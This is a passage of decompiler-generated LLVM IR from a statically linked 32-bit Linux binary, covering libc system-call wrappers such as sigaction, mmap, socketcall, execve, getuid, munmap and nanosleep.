  %v1_8054c0d = add i32 %v0_8054c0d, 1
  store i32 %v1_8054c0d, i32* %ebx.global-to-local, align 4
  %v1_8054c0e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c0e = icmp ult i32 %v1_8054c0d, %v1_8054c0e.pre
  br i1 %v7_8054c0e, label %dec_label_pc_8054c06, label %dec_label_pc_8054c12

dec_label_pc_8054c12:                             ; preds = %dec_label_pc_8054c06, %dec_label_pc_8054be1
  store i32 134564888, i32* %stack_var_-164, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 2), i32 0), label %dec_label_pc_8054c2a, label %dec_label_pc_8054c36

dec_label_pc_8054c2a:                             ; preds = %dec_label_pc_8054c12, %dec_label_pc_8054c2a
  %v4_8054c2a45 = phi i32 [ %v1_8054c31, %dec_label_pc_8054c2a ], [ 0, %dec_label_pc_8054c12 ]
  store i32 ptrtoint (i32* @global_var_8054c31.1004 to i32), i32* %stack_var_-164, align 4
  %v5_8054c2a = mul i32 %v4_8054c2a45, 4
  %v6_8054c2a = add i32 %v5_8054c2a, ptrtoint (i32* @global_var_805f3c8.994 to i32)
  %v7_8054c2a = inttoptr i32 %v6_8054c2a to i32*
  %v8_8054c2a = load i32, i32* %v7_8054c2a, align 4
  call void @__pseudo_call(i32 %v8_8054c2a)
  %v0_8054c31 = load i32, i32* @ebx, align 4
  %v1_8054c31 = add i32 %v0_8054c31, 1
  store i32 %v1_8054c31, i32* @ebx, align 4
  %v1_8054c32.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c32 = icmp ult i32 %v1_8054c31, %v1_8054c32.pre
  br i1 %v7_8054c32, label %dec_label_pc_8054c2a, label %dec_label_pc_8054c36

dec_label_pc_8054c36:                             ; preds = %dec_label_pc_8054c2a, %dec_label_pc_8054c12
  %v0_8054c3f = load i32, i32* %stack_var_-164, align 4
  %v1_8054c3f = call i32 @__errno_location(i32 %v0_8054c3f)
  %v1_8054c44 = inttoptr i32 %v1_8054c3f to i32*
  store i32 0, i32* %v1_8054c44, align 4
  %v0_8054c53 = call i32 @__GI___h_errno_location()
  store i32 %v0_8054c53, i32* @eax, align 4
  %v1_8054c58 = inttoptr i32 %v0_8054c53 to i32*
  store i32 0, i32* %v1_8054c58, align 4
  %v0_8054c5e = load i32, i32* @eax, align 4
  store i32 %v0_8054c5e, i32* %stack_var_-164, align 4
  %v0_8054c5f = load i32, i32* @global_var_8065b0c.992, align 4
  store i32 %v0_8054c5f, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8054ac3)
  %v0_8054c74 = load i32, i32* @eax, align 4
  %v1_8054c77 = call i32 @__GI_exit(i32 %v0_8054c74)
  %v0_8054c81 = load i32, i32* @ebx, align 4
  %v1_8054c81 = inttoptr i32 %v0_8054c81 to %sigcontext*
  %v2_8054c81 = call i32 @sigreturn(%sigcontext* %v1_8054c81)
  %v0_8054c89 = load i32, i32* @ebx, align 4
  %v1_8054c89 = inttoptr i32 %v0_8054c89 to %sigcontext*
  %v2_8054c89 = call i32 @sigreturn(%sigcontext* %v1_8054c89)
  ret i32 %v2_8054c89

; uselistorder directives
  uselistorder i32 %v1_8054c31, { 1, 2, 0 }
  uselistorder i32 %v1_8054c0d, { 1, 2, 0 }
  uselistorder i32 %v2_8054b4d, { 1, 0 }
  uselistorder i32 %v1_8054b4a, { 2, 1, 0 }
  uselistorder i32 %v1_8054b29, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054b26, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8054c2a, { 1, 0 }
  uselistorder label %dec_label_pc_8054c06, { 1, 0 }
  uselistorder label %dec_label_pc_8054be1, { 1, 0 }
  uselistorder label %dec_label_pc_8054b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8054b4a, { 1, 0 }
  uselistorder label %dec_label_pc_8054b32, { 1, 0 }
  uselistorder label %dec_label_pc_8054b0f, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054c8b = load i32, i32* @esi, align 4
  %v0_8054c8c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054ca1 = icmp eq i32* %arg2, null
  br i1 %v1_8054ca1, label %dec_label_pc_8054cf4, label %dec_label_pc_8054ca5

dec_label_pc_8054ca5:                             ; preds = %entry
  %v2_8054ca5 = load i32, i32* %arg2, align 4
  store i32 %v2_8054ca5, i32* %stack_var_-148, align 4
  %v1_8054cae = add i32 %tmp11, 4
  %v3_8054cc0 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054cc0 = call i32 @memcpy(i16* %v3_8054cc0, i32 %v1_8054cae, i32 128)
  %v1_8054cc5 = add i32 %tmp11, 132
  %v2_8054cdf = inttoptr i32 %v1_8054cc5 to i8*
  %v3_8054cdf = load i8, i8* %v2_8054cdf, align 1
  %v4_8054cdf = and i8 %v3_8054cdf, 4
  %v5_8054cdf = icmp eq i8 %v4_8054cdf, 0
  %v1_8054ce6 = icmp eq i1 %v5_8054cdf, false
  br i1 %v1_8054ce6, label %dec_label_pc_8054cf4, label %dec_label_pc_8054ce8

dec_label_pc_8054ce8:                             ; preds = %dec_label_pc_8054ca5
  br label %dec_label_pc_8054cf4

dec_label_pc_8054cf4:                             ; preds = %dec_label_pc_8054ce8, %dec_label_pc_8054ca5, %entry
  %v1_8054cf6 = icmp eq i32 %arg3, 0
  br i1 %v1_8054cf6, label %dec_label_pc_8054cfe, label %dec_label_pc_8054cfa

dec_label_pc_8054cfa:                             ; preds = %dec_label_pc_8054cf4
  %v2_8054cfa = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054cfe

dec_label_pc_8054cfe:                             ; preds = %dec_label_pc_8054cf4, %dec_label_pc_8054cfa
  %v0_8054d0d = phi i32 [ 0, %dec_label_pc_8054cf4 ], [ %v2_8054cfa, %dec_label_pc_8054cfa ]
  br i1 %v1_8054ca1, label %dec_label_pc_8054d0b, label %dec_label_pc_8054d04

dec_label_pc_8054d04:                             ; preds = %dec_label_pc_8054cfe
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8054d0b

dec_label_pc_8054d0b:                             ; preds = %dec_label_pc_8054cfe, %dec_label_pc_8054d04
  %v0_8054d0e = phi %sigaction* [ null, %dec_label_pc_8054cfe ], [ %phitmp, %dec_label_pc_8054d04 ]
  %v5_8054d16 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8054d0e, i32 %v0_8054d0d, i32 8)
  store i32 %v5_8054d16, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054cf6, label %dec_label_pc_8054d59, label %dec_label_pc_8054d24

dec_label_pc_8054d24:                             ; preds = %dec_label_pc_8054d0b
  %v2_8054d24 = icmp slt i32 %v5_8054d16, 0
  br i1 %v2_8054d24, label %dec_label_pc_8054d59, label %dec_label_pc_8054d28

dec_label_pc_8054d28:                             ; preds = %dec_label_pc_8054d24
  %v3_8054d28 = load i32, i32* %stack_var_-288, align 4
  %v2_8054d2c = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054d28, i32* %v2_8054d2c, align 4
  %v2_8054d34 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054d39 = add i32 %arg3, 4
  %v3_8054d3d = inttoptr i32 %v1_8054d39 to i16*
  %v4_8054d3d = call i32 @memcpy(i16* %v3_8054d3d, i32 %v2_8054d34, i32 128)
  %v2_8054d46 = add i32 %arg3, 132
  %v3_8054d46 = inttoptr i32 %v2_8054d46 to i32*
  %v2_8054d53 = add i32 %arg3, 136
  %v3_8054d53 = inttoptr i32 %v2_8054d53 to i32*
  %v0_8054d59.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d59

dec_label_pc_8054d59:                             ; preds = %dec_label_pc_8054d24, %dec_label_pc_8054d0b, %dec_label_pc_8054d28
  %v0_8054d59 = phi i32 [ %v5_8054d16, %dec_label_pc_8054d24 ], [ %v5_8054d16, %dec_label_pc_8054d0b ], [ %v0_8054d59.pre, %dec_label_pc_8054d28 ]
  store i32 %v0_8054c8c, i32* @ebx, align 4
  store i32 %v0_8054c8b, i32* @esi, align 4
  ret i32 %v0_8054d59

; uselistorder directives
  uselistorder i32 %v5_8054d16, { 0, 1, 3, 2 }
  uselistorder i1 %v1_8054cf6, { 1, 0 }
  uselistorder i1 %v1_8054ca1, { 1, 0 }
  uselistorder i32* null, { 2, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 18, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8054d59, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d0b, { 1, 0 }
  uselistorder label %dec_label_pc_8054cfe, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8054d67 = load i32, i32* @eax, align 4
  %v1_8054d69 = sub i32 0, %v0_8054d67
  %v1_8054d6b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8054d70 = inttoptr i32 %v1_8054d6b to i32*
  store i32 %v1_8054d69, i32* %v2_8054d70, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8054d7c = load i32, i32* @ebx, align 4
  %v2_8054d83 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8054d83, i32* @ebx, align 4
  %v8_8054d87 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8054d7c, i32* @ebx, align 4
  %v3_8054d90 = icmp ugt i32 %v8_8054d87, -4096
  call void @__pseudo_cond_branch(i1 %v3_8054d90, i32 134565220)
  ret i32 %v8_8054d87

; uselistorder directives
  uselistorder i32 %v8_8054d87, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134565220, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054d98 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d98, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054dab = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054dab, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8054dab, -4095
  br i1 %tmp8, label %dec_label_pc_8054dc4, label %dec_label_pc_8054db8

dec_label_pc_8054db8:                             ; preds = %entry
  %v0_8054db8 = load i32, i32* %stack_var_-4, align 4
  %v1_8054db8 = call i32 @__errno_location(i32 %v0_8054db8)
  %v0_8054dbd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054dbd = sub i32 0, %v0_8054dbd
  %v2_8054dbf = inttoptr i32 %v1_8054db8 to i32*
  store i32 %v1_8054dbd, i32* %v2_8054dbf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054dc4

dec_label_pc_8054dc4:                             ; preds = %entry, %dec_label_pc_8054db8
  %v0_8054dc4 = phi i32 [ %v1_8054dab, %entry ], [ -1, %dec_label_pc_8054db8 ]
  %v2_8054dc6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054dc6, i32* @edx, align 4
  %v2_8054dc8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054dc8, i32* @ebx, align 4
  ret i32 %v0_8054dc4

; uselistorder directives
  uselistorder i32 %v1_8054dab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054dc4, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054dcd = load i32, i32* @esi, align 4
  store i32 %v0_8054dcd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8054de1 = load i32, i32* @ebx, align 4
  %v7_8054de9 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054de9, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8054de9, -4095
  br i1 %tmp13, label %dec_label_pc_8054e01, label %dec_label_pc_8054df5

dec_label_pc_8054df5:                             ; preds = %entry
  %v1_8054df5 = call i32 @__errno_location(i32 %v0_8054de1)
  %v0_8054dfa = load i32, i32* %esi.global-to-local, align 4
  %v1_8054dfa = sub i32 0, %v0_8054dfa
  %v2_8054dfc = inttoptr i32 %v1_8054df5 to i32*
  store i32 %v1_8054dfa, i32* %v2_8054dfc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054e01

dec_label_pc_8054e01:                             ; preds = %entry, %dec_label_pc_8054df5
  %v0_8054e01 = phi i32 [ %v7_8054de9, %entry ], [ -1, %dec_label_pc_8054df5 ]
  %v2_8054e03 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e03, i32* @edx, align 4
  %v2_8054e04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054e04, i32* @esi, align 4
  ret i32 %v0_8054e01

; uselistorder directives
  uselistorder i32 %v7_8054de9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054e01, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e08 = load i32, i32* @ebx, align 4
  store i32 %v0_8054e08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8054e1b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8054e1b, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_8054e1b, -4095
  br i1 %tmp9, label %dec_label_pc_8054e34, label %dec_label_pc_8054e28

dec_label_pc_8054e28:                             ; preds = %entry
  %v0_8054e28 = load i32, i32* %stack_var_-4, align 4
  %v1_8054e28 = call i32 @__errno_location(i32 %v0_8054e28)
  %v0_8054e2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054e2d = sub i32 0, %v0_8054e2d
  %v2_8054e2f = inttoptr i32 %v1_8054e28 to i32*
  store i32 %v1_8054e2d, i32* %v2_8054e2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e34

dec_label_pc_8054e34:                             ; preds = %entry, %dec_label_pc_8054e28
  %v0_8054e34 = phi i32 [ %v4_8054e1b, %entry ], [ -1, %dec_label_pc_8054e28 ]
  %v2_8054e36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e36, i32* @edx, align 4
  %v2_8054e38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054e38, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054e34

; uselistorder directives
  uselistorder i32 %v4_8054e1b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054e34, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e3c = load i32, i32* @edi, align 4
  store i32 %v0_8054e3c, i32* %stack_var_-4, align 4
  %v4_8054e40 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054e40, i32* %edi.global-to-local, align 4
  %v0_8054e4c = load i32, i32* @ebx, align 4
  %v5_8054e54 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8054e54 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8054e54 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8054e54, [1 x i8*] %v8_8054e54)
  store i32 %v9_8054e54, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8054e54, -4095
  br i1 %tmp12, label %dec_label_pc_8054e6c, label %dec_label_pc_8054e60

dec_label_pc_8054e60:                             ; preds = %entry
  %v1_8054e60 = call i32 @__errno_location(i32 %v0_8054e4c)
  %v0_8054e65 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054e65 = sub i32 0, %v0_8054e65
  %v2_8054e67 = inttoptr i32 %v1_8054e60 to i32*
  store i32 %v1_8054e65, i32* %v2_8054e67, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054e6c

dec_label_pc_8054e6c:                             ; preds = %entry, %dec_label_pc_8054e60
  %v0_8054e6c = phi i32 [ %v9_8054e54, %entry ], [ -1, %dec_label_pc_8054e60 ]
  %v2_8054e6e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e6e, i32* @edx, align 4
  %v2_8054e70 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054e70, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054e6c

; uselistorder directives
  uselistorder i32 %v9_8054e54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054e6c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e74 = load i32, i32* @ebx, align 4
  store i32 %v0_8054e74, i32* %stack_var_-4, align 4
  %v1_8054e7d = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054e7d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054e7d, -4095
  br i1 %tmp6, label %dec_label_pc_8054e94, label %dec_label_pc_8054e88

dec_label_pc_8054e88:                             ; preds = %entry
  %v0_8054e88 = load i32, i32* %stack_var_-4, align 4
  %v1_8054e88 = call i32 @__errno_location(i32 %v0_8054e88)
  %v0_8054e8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054e8d = sub i32 0, %v0_8054e8d
  %v2_8054e8f = inttoptr i32 %v1_8054e88 to i32*
  store i32 %v1_8054e8d, i32* %v2_8054e8f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e94

dec_label_pc_8054e94:                             ; preds = %entry, %dec_label_pc_8054e88
  %v0_8054e94 = phi i32 [ %v1_8054e7d, %entry ], [ -1, %dec_label_pc_8054e88 ]
  %v2_8054e98 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054e98, i32* @ebx, align 4
  ret i32 %v0_8054e94

; uselistorder directives
  uselistorder i32 %v1_8054e7d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8054e94, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e9c = load i32, i32* @ebx, align 4
  store i32 %v0_8054e9c, i32* %stack_var_-4, align 4
  %v1_8054ea5 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8054ea5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054ea5, -4095
  br i1 %tmp6, label %dec_label_pc_8054ebc, label %dec_label_pc_8054eb0

dec_label_pc_8054eb0:                             ; preds = %entry
  %v0_8054eb0 = load i32, i32* %stack_var_-4, align 4
  %v1_8054eb0 = call i32 @__errno_location(i32 %v0_8054eb0)
  %v0_8054eb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054eb5 = sub i32 0, %v0_8054eb5
  %v2_8054eb7 = inttoptr i32 %v1_8054eb0 to i32*
  store i32 %v1_8054eb5, i32* %v2_8054eb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054ebc

dec_label_pc_8054ebc:                             ; preds = %entry, %dec_label_pc_8054eb0
  %v0_8054ebc = phi i32 [ %v1_8054ea5, %entry ], [ -1, %dec_label_pc_8054eb0 ]
  %v2_8054ec0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054ec0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054ebc

; uselistorder directives
  uselistorder i32 %v1_8054ea5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054ebc, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_8054ec4 = load i32, i32* @global_var_8065b10.1000, align 16
  %v1_8054ece = icmp eq i32 %v0_8054ec4, 0
  br i1 %v1_8054ece, label %dec_label_pc_8054ed4, label %dec_label_pc_8054ed2

dec_label_pc_8054ed2:                             ; preds = %entry
  br label %dec_label_pc_8054ed4

dec_label_pc_8054ed4:                             ; preds = %entry, %dec_label_pc_8054ed2
  %storemerge = phi i32 [ %v0_8054ec4, %dec_label_pc_8054ed2 ], [ 4096, %entry ]
  %v0_8054ed4 = phi i32 [ %v0_8054ec4, %dec_label_pc_8054ed2 ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8054ed4

; uselistorder directives
  uselistorder label %dec_label_pc_8054ed4, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054ed8 = load i32, i32* @ebx, align 4
  store i32 %v0_8054ed8, i32* %stack_var_-4, align 4
  %v1_8054ee1 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8054ee1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054ee1, -4095
  br i1 %tmp6, label %dec_label_pc_8054ef8, label %dec_label_pc_8054eec

dec_label_pc_8054eec:                             ; preds = %entry
  %v0_8054eec = load i32, i32* %stack_var_-4, align 4
  %v1_8054eec = call i32 @__errno_location(i32 %v0_8054eec)
  %v0_8054ef1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054ef1 = sub i32 0, %v0_8054ef1
  %v2_8054ef3 = inttoptr i32 %v1_8054eec to i32*
  store i32 %v1_8054ef1, i32* %v2_8054ef3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054ef8

dec_label_pc_8054ef8:                             ; preds = %entry, %dec_label_pc_8054eec
  %v0_8054ef8 = phi i32 [ %v1_8054ee1, %entry ], [ -1, %dec_label_pc_8054eec ]
  %v2_8054efc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054efc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054ef8

; uselistorder directives
  uselistorder i32 %v1_8054ee1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_8054ef8, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054f00 = load i32, i32* @ebx, align 4
  store i32 %v0_8054f00, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054f13 = call i32 @munmap(i32 %v0_8054f00, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8054f13, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8054f13, -4095
  br i1 %tmp8, label %dec_label_pc_8054f2c, label %dec_label_pc_8054f20

dec_label_pc_8054f20:                             ; preds = %entry
  %v0_8054f20 = load i32, i32* %stack_var_-4, align 4
  %v1_8054f20 = call i32 @__errno_location(i32 %v0_8054f20)
  %v0_8054f25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054f25 = sub i32 0, %v0_8054f25
  %v2_8054f27 = inttoptr i32 %v1_8054f20 to i32*
  store i32 %v1_8054f25, i32* %v2_8054f27, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f2c

dec_label_pc_8054f2c:                             ; preds = %entry, %dec_label_pc_8054f20
  %v0_8054f2c = phi i32 [ %v4_8054f13, %entry ], [ -1, %dec_label_pc_8054f20 ]
  %v2_8054f2e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054f2e, i32* @edx, align 4
  %v2_8054f30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054f30, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054f2c

; uselistorder directives
  uselistorder i32 %v4_8054f13, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054f2c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054f34 = load i32, i32* @ebx, align 4
  store i32 %v0_8054f34, i32* %stack_var_-4, align 4
  %v4_8054f38 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8054f38, i32* %ebx.global-to-local, align 4
  %v6_8054f47 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8054f47, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8054f47, -4095
  br i1 %tmp10, label %dec_label_pc_8054f60, label %dec_label_pc_8054f54

dec_label_pc_8054f54:                             ; preds = %entry
  %v0_8054f54 = load i32, i32* %stack_var_-4, align 4
  %v1_8054f54 = call i32 @__errno_location(i32 %v0_8054f54)
  %v0_8054f59 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054f59 = sub i32 0, %v0_8054f59
  %v2_8054f5b = inttoptr i32 %v1_8054f54 to i32*
  store i32 %v1_8054f59, i32* %v2_8054f5b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f60

dec_label_pc_8054f60:                             ; preds = %entry, %dec_label_pc_8054f54
  %v0_8054f60 = phi i32 [ %v6_8054f47, %entry ], [ -1, %dec_label_pc_8054f54 ]
  %v2_8054f62 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054f62, i32* @edx, align 4
  %v2_8054f64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054f64, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054f60

; uselistorder directives
  uselistorder i32 %v6_8054f47, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054f60, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8054f69 = load i32, i32* @ebx, align 4
  %v0_8054f6d = load i32, i32* @global_var_8065b44.1005, align 4
  %v1_8054f6d = icmp eq i32 %v0_8054f6d, 0
  %v1_8054f78 = icmp eq i1 %v1_8054f6d, false
  br i1 %v1_8054f78, label %dec_label_pc_8054f8b, label %dec_label_pc_8054f7a

